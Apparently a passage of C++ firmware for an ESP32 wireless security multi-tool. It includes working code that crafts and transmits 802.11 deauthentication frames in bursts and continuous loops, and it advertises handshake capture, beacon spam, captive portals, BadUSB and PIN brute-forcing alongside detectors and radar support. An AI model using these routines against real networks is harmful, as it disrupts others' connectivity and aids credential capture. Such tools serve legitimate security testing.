#include <Arduino.h>
#include <ArduinoJson.h>
#include <esp_wifi.h>
#include "BridgeProtocol.h"
#include "sniffer.h"
#include "portal.h"
#include "beacon.h"
#include "deauth_detector.h"
#include "hidden_ap.h"
#include "mesh.h"
#include "pin_bruteforce.h"
#include "ld2450.h"
#include "mbedtls/base64.h"
#include "Preferences.h"

#define FW_VERSION "1.0.0-beta.2"

#ifndef LD2450_BOOT_START
#define LD2450_BOOT_START 0
#endif
#ifndef LD2450_BOOT_DEBUG
#define LD2450_BOOT_DEBUG 0
#endif

#ifdef ENABLE_BLE_HID
#include "ble_hid.h"
#include "ble_scanner.h"
#include "ble_profile.h"
#include "ble_pin_bruteforce.h"
#endif

#if defined(CONFIG_IDF_TARGET_ESP32S2) || defined(CONFIG_IDF_TARGET_ESP32S3)
    #define MSC_SUPPORTED 1
    #define HID_SUPPORTED 1
    #include "mass_storage.h"
    #include "FileUpload.h"
    #include "UsbHID.h"
#else
    #define MSC_SUPPORTED 0
    #define HID_SUPPORTED 0
#endif


// ── Chip name ────────────────────────────────────────────────────────────────
#if defined(CONFIG_IDF_TARGET_ESP32C3)
    #define CHIP_NAME "ESP32-C3"
#elif defined(CONFIG_IDF_TARGET_ESP32C5)
    #define CHIP_NAME "ESP32-C5"
#elif defined(CONFIG_IDF_TARGET_ESP32S3)
    #define CHIP_NAME "ESP32-S3"
#elif defined(CONFIG_IDF_TARGET_ESP32S2)
    #define CHIP_NAME "ESP32-S2"
    #define LED_PIN 17
#else
    #define CHIP_NAME "ESP32"
#endif

BridgeProtocol proto(Serial);
Sniffer        sniffer;
PortalManager  portal;
BeaconSpammer  beacon;
DeauthDetector deauthDetector;
HiddenApDetector hiddenApDetector;
MeshManager    mesh;
Ld2450         ld2450;
#ifdef ENABLE_BLE_HID
BleScanner bleScanner;
BleProfile bleProfile;
#endif

// ── Persistent device ID ─────────────────────────────────────────────────────
static String getDeviceId() {
    static String cached;
    if (!cached.isEmpty()) return cached;

    Preferences prefs;
    if (prefs.begin("nrsuite", false)) {
        cached = prefs.getString("device_id", "");
        if (cached.isEmpty()) {
            char buf[16];
            snprintf(buf, sizeof(buf), "NR%08X", (unsigned)esp_random());
            cached = buf;
            prefs.putString("device_id", cached);
        }
        prefs.end();
    }

    if (cached.isEmpty()) cached = "NR00000000";
    return cached;
}

// ── IDF-level scan ───────────────────────────────────────────────────────────
static uint16_t g_lastHtmlSeq = 0xFFFF;


enum class WifiBandMode : uint8_t {
    BAND_2G = 0,
    BAND_5G,
    AUTO,
};

static const uint8_t WIFI_5G_CHANNELS[] = {
    36, 40, 44, 48, 52, 56, 60, 64,
    100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140, 144,
    149, 153, 157, 161, 165, 169, 173, 177,
};

static bool isWifi5GhzEnabled() {
#if defined(CONFIG_IDF_TARGET_ESP32C5)
    return true;
#else
    return false;
#endif
}

static bool isValidWifiChannel(uint8_t channel) {
    if (channel >= 1 && channel <= 14) return true;
    for (uint8_t ch : WIFI_5G_CHANNELS) {
        if (ch == channel) return true;
    }
    return false;
}

static const char* wifiBandForChannel(uint8_t channel) {
    return channel >= 36 ? "5g" : "2g";
}

static const char* wifiBandModeName(WifiBandMode mode) {
    switch (mode) {
        case WifiBandMode::BAND_2G: return "2g";
        case WifiBandMode::BAND_5G: return "5g";
        case WifiBandMode::AUTO: return "auto";
    }
    return "2g";
}

static int wifi5gChannelBit(uint8_t channel) {
    switch (channel) {
        case 36: return 1;
        case 40: return 2;
        case 44: return 3;
        case 48: return 4;
        case 52: return 5;
        case 56: return 6;
        case 60: return 7;
        case 64: return 8;
        case 100: return 9;
        case 104: return 10;
        case 108: return 11;
        case 112: return 12;
        case 116: return 13;
        case 120: return 14;
        case 124: return 15;
        case 128: return 16;
        case 132: return 17;
        case 136: return 18;
        case 140: return 19;
        case 144: return 20;
        case 149: return 21;
        case 153: return 22;
        case 157: return 23;
        case 161: return 24;
        case 165: return 25;
        case 169: return 26;
        case 173: return 27;
        case 177: return 28;
        default: return -1;
    }
}

static bool isChannelAllowedByCountry(uint8_t channel) {
    wifi_country_t country = {};
    if (esp_wifi_get_country(&country) != ESP_OK) return true;

    if (channel >= 1 && channel <= 14) {
        if (country.nchan == 0) return true;
        return channel >= country.schan &&
               channel < (uint16_t)country.schan + (uint16_t)country.nchan;
    }

#if CONFIG_SOC_WIFI_SUPPORT_5G
    if (!isWifi5GhzEnabled()) return false;
    const int bit = wifi5gChannelBit(channel);
    if (bit < 0) return false;
    // A zero mask means the local regulatory rules allow the 5 GHz channels.
    if (country.wifi_5g_channel_mask == 0) return true;
    return (country.wifi_5g_channel_mask & (1u << bit)) != 0;
#else
    return false;
#endif
}

static String regulatoryChannelError(uint8_t channel) {
    char cc[4] = {0};
    esp_wifi_get_country_code(cc);
    String error = "channel ";
    error += channel;
    error += " is not allowed by regulatory country ";
    error += (cc[0] ? cc : "01");
    return error;
}

static bool validateRegulatoryChannel(uint8_t channel, String& error) {
    if (isChannelAllowedByCountry(channel)) return true;
    error = regulatoryChannelError(channel);
    return false;
}

static void appendAllowedWifiChannels(JsonDocument& doc) {
    JsonArray channels2g = doc["allowed_2ghz_channels"].to<JsonArray>();
    const uint8_t max2g = 14;
    for (uint8_t channel = 1; channel <= max2g; channel++) {
        if (isChannelAllowedByCountry(channel)) channels2g.add(channel);
    }

    JsonArray channels5g = doc["allowed_5ghz_channels"].to<JsonArray>();
    if (isWifi5GhzEnabled()) {
        for (uint8_t channel : WIFI_5G_CHANNELS) {
            if (isChannelAllowedByCountry(channel)) channels5g.add(channel);
        }
    }
}

static void applyStoredWifiCountry() {
    Preferences prefs;
    String country = "01";
    if (prefs.begin("nrsuite", true)) {
        country = prefs.getString("wifi_country", "01");
        prefs.end();
    }
    country.trim();
    country.toUpperCase();
    if (country.length() != 2) country = "01";
    const esp_err_t err = esp_wifi_set_country_code(country.c_str(), false);
    if (err != ESP_OK) {
        Serial.printf("WiFi country %s rejected: %s (%d)\n",
                      country.c_str(), esp_err_to_name(err), (int)err);
        esp_wifi_set_country_code("01", false);
    }
}

static bool configureWifiBand(const char* band, WifiBandMode& mode, String& error) {
    const bool fiveSupported = isWifi5GhzEnabled();

    if (strcmp(band, "auto") == 0) {
        mode = fiveSupported ? WifiBandMode::AUTO : WifiBandMode::BAND_2G;
    } else if (strcmp(band, "2g") == 0 || strcmp(band, "2.4g") == 0) {
        mode = WifiBandMode::BAND_2G;
    } else if (strcmp(band, "5g") == 0) {
        if (!fiveSupported) {
            error = "5 GHz is not enabled in this firmware build";
            return false;
        }
        mode = WifiBandMode::BAND_5G;
    } else {
        error = "unsupported band";
        return false;
    }

    #if defined(CONFIG_IDF_TARGET_ESP32C5)
        if (mode == WifiBandMode::AUTO) {
            esp_wifi_set_band_mode(WIFI_BAND_MODE_AUTO);
        } else if (mode == WifiBandMode::BAND_5G) {
            esp_wifi_set_band_mode(WIFI_BAND_MODE_5G_ONLY);
        } else {
            esp_wifi_set_band_mode(WIFI_BAND_MODE_2G_ONLY);
        }
    #endif
    return true;
}

static int idf_scan_networks(BridgeProtocol& proto) {
    (void)proto;

    wifi_scan_config_t cfg = {};
    cfg.ssid        = nullptr;
    cfg.bssid       = nullptr;
    cfg.channel     = 0;
    cfg.show_hidden = true;
    cfg.scan_type   = WIFI_SCAN_TYPE_ACTIVE;
    cfg.scan_time.active.min = 100;
    cfg.scan_time.active.max = 300;

    // Use ESP-IDF's blocking scan. The Arduino SCAN_DONE event path has
    // proven unreliable on C5, leaving the command waiting until timeout.
    esp_err_t err = esp_wifi_scan_start(&cfg, true);
    if (err != ESP_OK) {
        Serial.printf("SCAN_WIFI: esp_wifi_scan_start failed: %s (%d)\n",
                      esp_err_to_name(err), (int)err);
        esp_wifi_scan_stop();
        return -1;
    }

    uint16_t count = 0;
    err = esp_wifi_scan_get_ap_num(&count);
    if (err != ESP_OK) {
        Serial.printf("SCAN_WIFI: esp_wifi_scan_get_ap_num failed: %s (%d)\n",
                      esp_err_to_name(err), (int)err);
        esp_wifi_scan_stop();
        return -1;
    }
    return (int)count;
}

static bool parseMac(const char* str, uint8_t out[6]) {
    if (!str || !str[0]) return false;
    return sscanf(str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
                  &out[0], &out[1], &out[2], &out[3], &out[4], &out[5]) == 6;
}

struct DeauthTxStats {
    uint32_t requested = 0;
    uint32_t sent = 0;
    uint32_t failed = 0;
};

static DeauthTxStats transmitDeauthFrames(
    const uint8_t bssid[6],
    const uint8_t client[6],
    uint32_t count,
    uint16_t intervalMs,
    uint8_t reason
) {
    DeauthTxStats stats;
    stats.requested = count;

    uint8_t deauthFrame[26] = {
        0xC0, 0x00, 0x00, 0x00,
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x07
    };
    memcpy(deauthFrame + 4, client, 6);
    memcpy(deauthFrame + 10, bssid, 6);
    memcpy(deauthFrame + 16, bssid, 6);

    uint16_t seq = 0x0010;
    for (uint32_t i = 0; i < count; i++) {
        deauthFrame[22] = seq & 0xFF;
        deauthFrame[23] = (seq >> 8) & 0xFF;
        deauthFrame[25] = reason;
        if (esp_wifi_80211_tx(WIFI_IF_AP, deauthFrame, sizeof(deauthFrame), true) == ESP_OK) {
            stats.sent++;
        } else {
            stats.failed++;
        }
        seq += 0x0010;
        if (intervalMs > 0 && i + 1 < count) delay(intervalMs);
    }
    return stats;
}

static volatile bool gDeauthLoopActive = false;
static volatile bool gDeauthLoopStopRequested = false;
static TaskHandle_t gDeauthLoopTaskHandle = nullptr;
static uint8_t gDeauthLoopBssid[6] = {0};
static uint8_t gDeauthLoopClient[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
static uint32_t gDeauthLoopDurationSec = 0;
static uint16_t gDeauthLoopIntervalMs = 100;
static uint8_t gDeauthLoopReason = 7;
static uint32_t gDeauthLoopSent = 0;
static uint32_t gDeauthLoopFailed = 0;
static uint32_t gDeauthLoopStartedMs = 0;

static void sendDeauthLoopStatsEvent(const char* status, bool stopped) {
    JsonDocument ev;
    ev["status"] = status;
    ev["mode"] = "loop";
    ev["sent_frames"] = gDeauthLoopSent;
    ev["failed_frames"] = gDeauthLoopFailed;
    ev["duration_s"] = gDeauthLoopDurationSec;
    ev["interval_ms"] = gDeauthLoopIntervalMs;
    ev["elapsed_ms"] = gDeauthLoopStartedMs == 0 ? 0 : (millis() - gDeauthLoopStartedMs);
    ev["stopped"] = stopped;
    proto.sendEvent("deauth_stats", ev);
}

static void deauthLoopTaskFn(void*) {
    uint8_t frame[26] = {
        0xC0, 0x00, 0x00, 0x00,
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x07
    };
    memcpy(frame + 4, gDeauthLoopClient, 6);
    memcpy(frame + 10, gDeauthLoopBssid, 6);
    memcpy(frame + 16, gDeauthLoopBssid, 6);

    const uint32_t durationMs = gDeauthLoopDurationSec * 1000UL;
    uint16_t seq = 0x0010;
    uint32_t lastStatsMs = millis();

    while (!gDeauthLoopStopRequested) {
        const uint32_t elapsedMs = millis() - gDeauthLoopStartedMs;
        if (durationMs > 0 && elapsedMs >= durationMs) break;

        frame[22] = seq & 0xFF;
        frame[23] = (seq >> 8) & 0xFF;
        frame[25] = gDeauthLoopReason;
        if (esp_wifi_80211_tx(WIFI_IF_AP, frame, sizeof(frame), true) == ESP_OK) {
            gDeauthLoopSent++;
        } else {
            gDeauthLoopFailed++;
        }
        seq += 0x0010;

        if (millis() - lastStatsMs >= 2000) {
            lastStatsMs = millis();
            sendDeauthLoopStatsEvent("running", false);
        }

        uint32_t sleepMs = gDeauthLoopIntervalMs;
        if (durationMs > 0) {
            const uint32_t remainingMs = durationMs > elapsedMs
                ? durationMs - elapsedMs
                : 0;
            if (remainingMs < sleepMs) sleepMs = remainingMs;
        }
        if (sleepMs > 0) vTaskDelay(pdMS_TO_TICKS(sleepMs));
        else vTaskDelay(pdMS_TO_TICKS(1));
    }

    gDeauthLoopActive = false;
    sendDeauthLoopStatsEvent("finished", gDeauthLoopStopRequested);
    gDeauthLoopTaskHandle = nullptr;
    vTaskDelete(nullptr);
}

static void stopDeauthLoopAndWait(uint32_t timeoutMs = 1200) {
    if (!gDeauthLoopActive && gDeauthLoopTaskHandle == nullptr) return;
    gDeauthLoopStopRequested = true;
    const uint32_t started = millis();
    while (gDeauthLoopActive && millis() - started < timeoutMs) {
        delay(10);
    }
    if (!gDeauthLoopActive) gDeauthLoopTaskHandle = nullptr;
}

static const char* authModeStr(wifi_auth_mode_t mode) {
    switch (mode) {
        case WIFI_AUTH_OPEN:            return "OPEN";
        case WIFI_AUTH_WEP:             return "WEP";
        case WIFI_AUTH_WPA_PSK:         return "WPA-PSK";
        case WIFI_AUTH_WPA2_PSK:        return "WPA2-PSK";
        case WIFI_AUTH_WPA_WPA2_PSK:    return "WPA/WPA2-PSK";
        case WIFI_AUTH_WPA2_ENTERPRISE: return "WPA2-ENTERPRISE";
        case WIFI_AUTH_WPA3_PSK:        return "WPA3-PSK";
        case WIFI_AUTH_WPA2_WPA3_PSK:   return "WPA2/WPA3-PSK";
        case WIFI_AUTH_WAPI_PSK:        return "WAPI-PSK";
        default:                        return "UNKNOWN";
    }
}

// Stop every radio/network subsystem before starting a new one.
// Call this at the top of any CMD that touches Wi-Fi TX/RX.
static void stopRadioModules() {
    stopDeauthLoopAndWait();
    mesh.stop();
    sniffer.stop();
    deauthDetector.stop();
    hiddenApDetector.stop();
    beacon.stop();
    portal.stop();
    esp_wifi_set_promiscuous(false);
}

static void stopAllModules() {
    pinBruteforce.stop();
    ld2450.stop();
    stopRadioModules();
    #ifdef ENABLE_BLE_HID
        bleProfile.stop();
        bleScanner.stop();
        BleHid::end();
        blePinBruteforce.onBleEnded();
    #endif
    #if MSC_SUPPORTED
        FileUpload::reset();
    #endif
    vTaskDelay(pdMS_TO_TICKS(120));
}

static void radioIdle() {
    stopRadioModules();
    #ifdef ENABLE_BLE_HID
        bleProfile.stop();
        bleScanner.stop();
    #endif
    vTaskDelay(pdMS_TO_TICKS(80));
}

// ── LD2450 command/event layer ────────────────────────────────────────────────
static constexpr uint32_t LD2450_BAUD = 256000;
static constexpr int8_t LD2450_RX_PIN = 16;
static constexpr int8_t LD2450_TX_PIN = 17;

static uint32_t ld2450StartedMs = 0;
static uint32_t ld2450LastTargetsFrame = 0;
static uint32_t ld2450LastErrorEventMs = 0;
static uint32_t ld2450LastInvalidFrames = 0;
static bool ld2450LastPresence = false;

static void resetLd2450EventTracking() {
    ld2450StartedMs = millis();
    ld2450LastTargetsFrame = ld2450.validFrames();
    ld2450LastErrorEventMs = 0;
    ld2450LastInvalidFrames = ld2450.invalidFrames();
    ld2450LastPresence = ld2450.targetCount() > 0;
}

static void appendLd2450Status(JsonDocument& doc) {
    const uint32_t now = millis();
    const uint32_t lastFrameMs = ld2450.lastFrameMs();
    doc["active"] = ld2450.active();
    doc["debug"] = ld2450.debugPrint();
    doc["valid_frames"] = ld2450.validFrames();
    doc["invalid_frames"] = ld2450.invalidFrames();
    doc["dropped_bytes"] = ld2450.droppedBytes();
    doc["target_count"] = ld2450.targetCount();
    doc["presence"] = ld2450.targetCount() > 0;
    doc["has_data"] = ld2450.hasData();
    doc["last_frame_ms"] = lastFrameMs;
    doc["uptime_ms"] = now;
    doc["baud"] = LD2450_BAUD;
    doc["rx_pin"] = LD2450_RX_PIN;
    doc["tx_pin"] = LD2450_TX_PIN;
    if (lastFrameMs > 0) {
        doc["last_frame_age_ms"] = now >= lastFrameMs ? (now - lastFrameMs) : 0;
    } else {
        doc["last_frame_age_ms"] = 0;
    }
}

static void sendLd2450StatusResp(uint8_t id, bool ok = true, const char* msg = nullptr) {
    JsonDocument resp;
    resp["ok"] = ok;
    if (msg) resp["msg"] = msg;
    appendLd2450Status(resp);
    String json;
    serializeJson(resp, json);
    proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
}

static void emitLd2450Events() {
    if (!ld2450.active()) return;
    const uint32_t now = millis();
    const uint8_t targetCount = ld2450.targetCount();
    const bool present = targetCount > 0;
    const uint32_t validFrames = ld2450.validFrames();

    if (validFrames != ld2450LastTargetsFrame) {
        ld2450LastTargetsFrame = validFrames;
        JsonDocument ev;
        ev["uptime"] = now;
        ev["target_count"] = targetCount;
        ev["has_data"] = ld2450.hasData();
        ev["valid_frames"] = validFrames;
        JsonArray targets = ev["targets"].to<JsonArray>();
        const Ld2450::Target* data = ld2450.targets();
        for (uint8_t i = 0; i < 3; i++) {
            const Ld2450::Target& target = data[i];
            if (!target.valid) continue;
            JsonObject item = targets.add<JsonObject>();
            item["slot"] = i + 1;
            item["x_mm"] = target.xMm;
            item["y_mm"] = target.yMm;
            item["speed_cm_s"] = target.speedCmS;
            item["resolution_mm"] = target.resolutionMm;
        }
        proto.sendEvent("ld2450_targets", ev);
    }

    if (present != ld2450LastPresence) {
        ld2450LastPresence = present;
        JsonDocument ev;
        ev["uptime"] = now;
        ev["present"] = present;
        ev["target_count"] = targetCount;
        proto.sendEvent("ld2450_presence", ev);
    }

    const uint32_t invalidFrames = ld2450.invalidFrames();
    const bool parseError = invalidFrames > ld2450LastInvalidFrames;
    const bool noData = validFrames == 0 && now - ld2450StartedMs >= 3000;
    bool errorSent = false;
    if ((parseError || noData) && now - ld2450LastErrorEventMs >= 3000) {
        JsonDocument ev;
        ev["kind"] = parseError ? "parse_error" : "no_data";
        ev["msg"] = parseError ? "LD2450 frame parse error" : "No LD2450 frames received";
        ev["active"] = true;
        ev["valid_frames"] = validFrames;
        ev["invalid_frames"] = invalidFrames;
        ev["dropped_bytes"] = ld2450.droppedBytes();
        ev["last_frame_age_ms"] = ld2450.lastFrameMs() > 0
            ? (now >= ld2450.lastFrameMs() ? now - ld2450.lastFrameMs() : 0)
            : 0;
        proto.sendEvent("ld2450_error", ev);
        ld2450LastErrorEventMs = now;
        errorSent = true;
    }
    if (!parseError || errorSent) {
        ld2450LastInvalidFrames = invalidFrames;
    }
}

// ── Command Handler ──────────────────────────────────────────────────────────
void handleCmd(uint8_t id, JsonDocument& doc) {
    const char* cmd = doc["cmd"] | "";
    if (cmd[0] == '\0') {
        proto.sendResp(id, false, "missing cmd");
        return;
    }

    // ── MESH FOUNDATION ───────────────────────────────────────────────────
    if (strncmp(cmd, "MESH_", 5) == 0) {
        if (strcmp(cmd, "MESH_ACTIVATE") == 0) {
            stopAllModules();
        }
        mesh.handleCommand(id, doc);
        return;
    }

    // ── PING ──────────────────────────────────────────────────────────────
    if (strcmp(cmd, "PING") == 0) {
        proto.sendResp(id, true, "pong");
    }

    // ── REGULATORY COUNTRY ────────────────────────────────────────────────
    else if (strcmp(cmd, "SET_COUNTRY") == 0) {
        String requested = doc["args"]["country"] | "";
        requested.trim();
        requested.toUpperCase();
        if (requested.length() != 2) {
            proto.sendResp(id, false, "country code must be two characters");
            return;
        }

        const esp_err_t err = esp_wifi_set_country_code(requested.c_str(), false);
        if (err != ESP_OK) {
            String msg = "country rejected: ";
            msg += esp_err_to_name(err);
            proto.sendResp(id, false, msg.c_str());
            return;
        }

        Preferences prefs;
        if (prefs.begin("nrsuite", false)) {
            prefs.putString("wifi_country", requested);
            prefs.end();
        }

        JsonDocument resp;
        resp["ok"] = true;
        resp["country"] = requested;
        appendAllowedWifiChannels(resp);
        String json;
        serializeJson(resp, json);
        proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
    }

    // ── STATUS ────────────────────────────────────────────────────────────
    else if (strcmp(cmd, "STATUS") == 0 || strcmp(cmd, "HEAP") == 0) {
        JsonDocument resp;
        resp["ok"]       = true;
        resp["uptime"]   = millis();
        resp["heap"]     = ESP.getFreeHeap();
        resp["chip"]      = CHIP_NAME;
        resp["proto"]       = 1;
        resp["proto_minor"] = 1;
        resp["fw"]          = FW_VERSION;
        resp["device_id"] = getDeviceId();
        char countryCode[4] = {0};
        if (esp_wifi_get_country_code(countryCode) != ESP_OK) {
            strcpy(countryCode, "01");
        }
        resp["country"] = countryCode;
        appendAllowedWifiChannels(resp);
        JsonArray features = resp["features"].to<JsonArray>();
        features.add("wifi");
        features.add("wifi_2ghz");
        #if defined(CONFIG_IDF_TARGET_ESP32C5)
            features.add("wifi_5ghz");
        #endif
        features.add("sniff");
        features.add("auto_handshake");
        features.add("nrugochi");
        features.add("client_detect");
        features.add("deauth");
        features.add("deauth_detect");
        features.add("beacon");
        features.add("portal");
        features.add("portal_html_offset");
        features.add("html_diag");
        features.add("stop_all");
        features.add("wps");
        features.add("hidden_ap");
        features.add("storage");
        features.add("ld2450");
        // Capability flag: mesh code is present and can be provisioned.
        features.add("mesh_provision");
        // Availability flag: only advertised once valid derived keys exist.
        if (mesh.initialized()) {
            features.add("mesh");
        }
        #ifdef ENABLE_BLE_HID
            features.add("ble_hid");
            features.add("ble_scan");
            features.add("ble_profile");
            features.add("ble_pin_bruteforce");
        #endif
        #if MSC_SUPPORTED
            features.add("msc");
            features.add("msc_read_chunk");
        #endif
        #if HID_SUPPORTED
            features.add("badusb");
            features.add("pin_bruteforce");
        #endif
        resp["sniffing"] = sniffer.active();
        resp["client_detecting"] = sniffer.active() && sniffer.clientOnly();
        resp["oversized_frames"] = proto.oversizedFrameCount();
        if (sniffer.active()) {
            resp["channel"] = sniffer.channel();
        }
        resp["portal"]   = portal.isRunning();
        resp["beacon"]   = beacon.active();
        resp["deauth_detector"] = deauthDetector.active();
        resp["hidden_ap"] = hiddenApDetector.active();
        #ifdef ENABLE_BLE_HID
            resp["ble_scanning"] = bleScanner.scanning();
            resp["ble_profiling"] = bleProfile.active();
        #endif
        if (deauthDetector.active()) {
            DeauthDetectStats ds = deauthDetector.stats();
            resp["deauth_detector_channel"] = deauthDetector.channel();
            resp["deauth_detector_hopping"] = deauthDetector.hopping();
            resp["deauth_detected"] = ds.detected;
            resp["deauth_detector_sent"] = ds.sent;
            resp["deauth_detector_dropped"] = ds.dropped;
        }
        if (hiddenApDetector.active()) {
            HiddenApStats hs = hiddenApDetector.stats();
            resp["hidden_ap_channel"] = hiddenApDetector.channel();
            resp["hidden_ap_hopping"] = hiddenApDetector.hopping();
            resp["hidden_ap_seen"] = hs.hiddenSeen;
            resp["hidden_ap_candidates"] = hs.candidates;
            resp["hidden_ap_resolved"] = hs.resolved;
            resp["hidden_ap_sent"] = hs.sent;
            resp["hidden_ap_dropped"] = hs.dropped;
        }
        if (beacon.active()) {
            BeaconStats bs = beacon.stats();
            resp["beacon_ssids"] = bs.ssids;
            resp["beacon_sent"]  = bs.sent;
            resp["beacon_channel"] = bs.channel;
        }
        String json; serializeJson(resp, json);
        proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
    }

    // ── STOP_ALL ──────────────────────────────────────────────────────────
    else if (strcmp(cmd, "STOP_ALL") == 0) {
        stopAllModules();
        proto.sendResp(id, true, "all modules stopped");
    }

    // ── LD2450 MM-WAVE RADAR ──────────────────────────────────────────────
    else if (strcmp(cmd, "LD2450_START") == 0) {
        const bool debug = doc["args"]["debug"] | false;
        bool ok = ld2450.begin(Serial1, LD2450_BAUD, LD2450_RX_PIN, LD2450_TX_PIN, debug);
        resetLd2450EventTracking();
        sendLd2450StatusResp(id, ok, ok ? "ld2450 started" : "ld2450 start failed");
    }

    else if (strcmp(cmd, "LD2450_STOP") == 0) {
        ld2450.stop();
        resetLd2450EventTracking();
        sendLd2450StatusResp(id, true, "ld2450 stopped");
    }

    else if (strcmp(cmd, "LD2450_STATUS") == 0) {
        sendLd2450StatusResp(id, true, nullptr);
    }

    // ── START_SNIFF ──────────────────────────────────────────────────────
    else if (strcmp(cmd, "START_SNIFF") == 0) {
        radioIdle();  // stop beacon / portal / prior sniff before starting

        const char* band = doc["args"]["band"] | "auto";
        WifiBandMode bandMode = WifiBandMode::BAND_2G;
        String bandError;
        if (!configureWifiBand(band, bandMode, bandError)) {
            proto.sendResp(id, false, bandError.c_str());
            return;
        }

        const char* mode      = doc["args"]["mode"] | "fixed";
        bool        eapolOnly = doc["args"]["eapol_only"] | false;
        bool        allBeacons = doc["args"]["all_beacons"] | false;
        const char* bssidStr  = doc["args"]["bssid"] | "";
        const bool allow5ghz = bandMode != WifiBandMode::BAND_2G;

        uint8_t bssid[6];
        bool hasBssid = parseMac(bssidStr, bssid);
        sniffer.setEapolFilter(eapolOnly, hasBssid ? bssid : nullptr, allBeacons);

        bool ok;
        if (strcmp(mode, "hop") == 0) {
            uint16_t interval = doc["args"]["interval_ms"] | 300;
            ok = sniffer.startHop(interval, allow5ghz);
        } else {
            uint8_t channel = doc["args"]["channel"] | 1;
            if (!isValidWifiChannel(channel)) {
                proto.sendResp(id, false, "invalid channel");
                return;
            }
            String regulatoryError;
            if (!validateRegulatoryChannel(channel, regulatoryError)) {
                proto.sendResp(id, false, regulatoryError.c_str());
                return;
            }
            ok = sniffer.startFixed(channel, allow5ghz);
        }

        proto.sendResp(id, ok, ok ? "sniffing started" : "invalid channel");
    }

    // ── STOP_SNIFF ────────────────────────────────────────────────────────
    else if (strcmp(cmd, "STOP_SNIFF") == 0) {
        SniffStats s = sniffer.stats();
        if (sniffer.active()) {
            sniffer.stop();
        } else {
            esp_wifi_set_promiscuous(false);
        }
        JsonDocument resp;
        resp["ok"]       = true;
        resp["captured"] = s.captured;
        resp["sent"]     = s.sent;
        resp["dropped"]  = s.dropped;
        String json; serializeJson(resp, json);
        proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
    }

    // ── CLIENT / PRESENCE DETECTOR ───────────────────────────────────────
    else if (strcmp(cmd, "START_CLIENT_DETECT") == 0) {
        radioIdle();

        const char* band = doc["args"]["band"] | "auto";
        WifiBandMode bandMode = WifiBandMode::BAND_2G;
        String bandError;
        if (!configureWifiBand(band, bandMode, bandError)) {
            proto.sendResp(id, false, bandError.c_str());
            return;
        }
        const bool allow5ghz = bandMode != WifiBandMode::BAND_2G;

        const char* mode = doc["args"]["mode"] | "fixed";
        bool ok;
        if (strcmp(mode, "hop") == 0) {
            uint16_t interval = doc["args"]["interval_ms"] | 300;
            ok = sniffer.startClientHop(interval, allow5ghz);
        } else {
            uint8_t channel = doc["args"]["channel"] | 1;
            if (!isValidWifiChannel(channel)) {
                proto.sendResp(id, false, "invalid channel");
                return;
            }
            String regulatoryError;
            if (!validateRegulatoryChannel(channel, regulatoryError)) {
                proto.sendResp(id, false, regulatoryError.c_str());
                return;
            }
            ok = sniffer.startClientFixed(channel, allow5ghz);
        }

        proto.sendResp(id, ok, ok ? "client detection started" : "invalid channel");
    }

    else if (strcmp(cmd, "STOP_CLIENT_DETECT") == 0) {
        if (sniffer.active()) {
            sniffer.stop();
        } else {
            esp_wifi_set_promiscuous(false);
        }
        SniffStats s = sniffer.stats();
        JsonDocument resp;
        resp["ok"]       = true;
        resp["captured"] = s.captured;
        resp["sent"]     = s.sent;
        resp["dropped"]  = s.dropped;
        String json; serializeJson(resp, json);
        proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
    }

    // ── HIDDEN AP ENUMERATOR ─────────────────────────────────────────────
    else if (strcmp(cmd, "START_HIDDEN_AP") == 0) {
        radioIdle();

        const char* band = doc["args"]["band"] | "auto";
        WifiBandMode bandMode = WifiBandMode::BAND_2G;
        String bandError;
        if (!configureWifiBand(band, bandMode, bandError)) {
            proto.sendResp(id, false, bandError.c_str());
            return;
        }

        HiddenApConfig config;
        const char* mode = doc["args"]["mode"] | "fixed";
        config.hop = strcmp(mode, "hop") == 0;
        config.include5ghz = bandMode != WifiBandMode::BAND_2G;
        config.channel = doc["args"]["channel"] | 1;
        config.intervalMs = doc["args"]["interval_ms"] | 300;
        if (!config.hop) {
            String regulatoryError;
            if (!validateRegulatoryChannel(config.channel, regulatoryError)) {
                proto.sendResp(id, false, regulatoryError.c_str());
                return;
            }
        }

        bool ok = hiddenApDetector.start(config);
        proto.sendResp(id, ok, ok ? "hidden AP detection started" : "invalid channel");
    }

    else if (strcmp(cmd, "STOP_HIDDEN_AP") == 0) {
        HiddenApStats hs = hiddenApDetector.stats();
        hiddenApDetector.stop();
        JsonDocument resp;
        resp["ok"]        = true;
        resp["hidden"]    = hs.hiddenSeen;
        resp["candidates"]= hs.candidates;
        resp["resolved"]  = hs.resolved;
        resp["sent"]      = hs.sent;
        resp["dropped"]   = hs.dropped;
        String json; serializeJson(resp, json);
        proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
    }

    else if (strcmp(cmd, "HIDDEN_AP_FORCE_RECONNECT") == 0) {
        const char* bssidStr  = doc["args"]["bssid"]  | "";
        const char* clientStr = doc["args"]["client"] | "FF:FF:FF:FF:FF:FF";
        uint8_t bssid[6] = {0};
        uint8_t client[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

        if (!parseMac(bssidStr, bssid)) {
            proto.sendResp(id, false, "invalid bssid");
            return;
        }
        parseMac(clientStr, client);

        uint8_t  channel   = doc["args"]["channel"] | 1;
        uint16_t count     = doc["args"]["count"] | 5;
        uint16_t interval  = doc["args"]["interval_ms"] | 60;
        uint8_t  reason    = doc["args"]["reason"] | 7;

        bool ok = hiddenApDetector.forceReconnect(
            bssid, client, channel, count, interval, reason
        );
        proto.sendResp(id, ok, ok ? "reconnect burst sent" : "hidden AP detector not active or TX failed");
    }

